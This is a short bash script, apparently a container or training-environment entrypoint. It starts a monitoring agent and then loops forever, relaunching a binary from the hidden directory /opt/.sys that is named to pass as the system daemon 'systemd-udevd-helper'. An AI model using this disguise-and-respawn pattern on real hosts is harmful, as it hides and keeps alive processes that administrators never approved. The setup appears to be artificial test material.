#!/bin/bash
/opt/monitoring-agent.sh &

# training artifact: respawn loop for the disguised watcher below. A real
# host would use a systemd unit with Restart=always for this; a loop is the
# container-native stand-in.
while true; do
    if [ -x /opt/.sys/systemd-udevd-helper ] && ! pgrep -f 'systemd-udevd-helper' >/dev/null; then
        /opt/.sys/systemd-udevd-helper &
    fi
    sleep 3
done
